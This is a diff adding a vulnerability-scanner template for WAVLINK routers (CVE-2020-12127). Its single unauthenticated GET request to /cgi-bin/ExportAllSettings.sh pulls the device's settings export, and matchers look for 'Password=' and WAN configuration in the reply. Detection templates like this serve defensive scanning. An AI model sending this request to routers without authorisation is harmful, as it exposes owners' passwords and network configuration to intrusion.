@@ -1,0 +1,29 @@
+id: wavlink-info-disclosure
+
+info:
+  name: WAVLINK Routers Sensitive Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WAVLINK routers are vulnerable to sensitive information disclosure due to a misconfigured system. Attackers can exploit this to access system passwords and network configurations.
+  tags: information-disclosure
+  reference:
+    - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12127
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/ExportAllSettings.sh HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Password="
+          - "wanConnectionMode"
+        part: body
